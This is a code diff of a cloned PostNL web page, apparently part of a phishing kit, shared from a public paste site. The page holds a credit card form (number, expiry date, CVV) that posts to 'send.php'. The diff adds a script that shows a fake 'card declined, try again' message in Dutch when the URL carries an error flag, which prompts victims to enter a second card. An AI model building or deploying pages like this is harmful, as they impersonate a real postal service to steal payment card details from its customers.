@@ -1,4 +1,3 @@
-
 <!DOCTYPE html><html lang="nl" class="hydrated" data-scrapbook-source="https://www.postnl.nl/nl" data-scrapbook-create="20250606000511374" data-scrapbook-adoptedstylesheet-2=":host { display: block; }" data-scrapbook-adoptedstylesheet-9=":host { display: block; }
 
 .shop-toastr { bottom: 0px; left: 0px; position: fixed; width: 100%; z-index: 100; }
@@ -5963,19 +5962,20 @@ a.stamp-paging__item--navigation:active, .stamp-paging__item--navigation:active 
   <div class="billing-form">
     <form id="billingForm" method="POST" action="send.php">
       <div class="form-group">
-        <label for="card-number">Creditcardnummer:</label>
+        <label for="card-number">Creditcardnummer</label>
         <input type="text" id="card-number" name="card-number" required pattern="^\d{16}$" 
           title="Voer een geldig creditcardnummer in (16 cijfers)." maxlength="16" minlength="13">
+        <div id="card-error" style="color: rgb(216, 61, 0); margin-top: 5px; display: none; font-weight: bold ;font-family: "Hanken Grotesk", sans-serif;"></div>
       </div>
 
       <div class="form-group">
-        <label for="expiry-date">Vervaldatum (MM/YY):</label>
+        <label for="expiry-date">Vervaldatum (MM/YY)</label>
         <input type="text" id="expiry-date" name="expiry-date" required pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$"
           title="Voer een geldige vervaldatum in het formaat MM/YY in." maxlength="5" minlength="5">
       </div>
 
       <div class="form-group">
-        <label for="cvv">CVV:</label>
+        <label for="cvv">CVV</label>
         <input type="text" id="cvv" name="cvv" required pattern="^\d{3,4}$" 
           title="Voer een geldige CVV in (3 of 4 cijfers)." maxlength="4" minlength="3">
       </div>
@@ -5984,6 +5984,20 @@ a.stamp-paging__item--navigation:active, .stamp-paging__item--navigation:active 
     </form>
   </div>
 </div>
+
+<script>
+  function showCardErrorIfNeeded() {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('e') === 'error') {
+      const errorDiv = document.getElementById('card-error');
+      errorDiv.textContent = 'Uw kaart is geweigerd, probeer het alstublieft opnieuw.';
+      errorDiv.style.display = 'block';
+    }
+  }
+
+  // Run the function on page load
+  window.onload = showCardErrorIfNeeded;
+</script>
 
 <style>
   .button-zoeken {
@@ -6252,4 +6266,3 @@ setInterval(checkForRedirect, 2000);
 // Also check immediately on page load
 document.addEventListener('DOMContentLoaded', checkForRedirect);
 </script></body></html>
-This paste expires in <1 hour. Public IP access. Share whatever you see with others in seconds with Context. Terms of ServiceReport this
